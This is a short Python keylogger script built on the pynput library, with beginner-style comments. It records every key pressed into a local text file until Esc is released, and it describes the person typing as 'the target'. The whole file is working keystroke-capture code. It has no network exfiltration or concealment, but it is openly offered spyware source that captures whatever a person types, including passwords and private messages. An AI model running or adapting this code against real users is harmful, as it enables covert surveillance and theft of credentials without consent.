from pynput.keyboard import Listener, Key

def on_press_function(caputed_key):

    file_path = "Key Logger/test_keys_file.txt"

    with open(file_path, "a") as logged_keys:
        logged_keys.write(f"{str(caputed_key)}\n")
        print("\nA key is captured and logged")

def on_release_function(caputed_key):
    if caputed_key == Key.esc:
        print("\nStopping listener")
        return False

with Listener(on_press=on_press_function, on_release=on_release_function) as listener_object:
    listener_object.join()


# < ------------ NOTES ------------ >

# Listener is used listen what the target is typing and capture the typed keys
# Listener has two optional parameters that you can provide a function as an argument for
#   on_press= <function name>
#   on_release= <function name>

# The functions that were passed as arguments will recieve the captured key as an argument
# .join() is used to begin listening to the keys typed
# return False in the on_release_function will stop the listener